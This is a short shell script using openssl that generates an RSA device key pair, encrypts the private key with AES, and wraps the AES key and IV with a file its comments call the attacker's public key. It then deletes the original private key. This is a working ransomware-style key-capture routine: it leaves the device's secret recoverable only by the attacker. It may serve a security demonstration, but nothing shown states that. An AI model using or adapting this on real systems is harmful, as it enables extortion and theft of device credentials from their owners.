#!/bin/sh
set -ue

# Generate the RSA-2048 private key.
openssl genpkey -out device_key.pk -algorithm rsa -pkeyopt rsa_keygen_bits:2048
# Generate the corresponding public key.
openssl pkey -in device_key.pk -out device_key.pub -pubout

# Encrypt this with with attackers public key.

# First encrypt the private key with AES.
aes_key=$(openssl rand -hex 32)
iv=$(openssl rand -hex 16)

openssl enc -aes-256-cbc -K $aes_key -iv $iv -in device_key.pk -out device_key.pk.aes

# Then RSA encrypt the AES information.
echo $aes_key$iv | openssl pkeyutl -encrypt -pubin -inkey attack.pub -out device_key-aes.rsa

# Remove intermediary files
rm device_key.pk
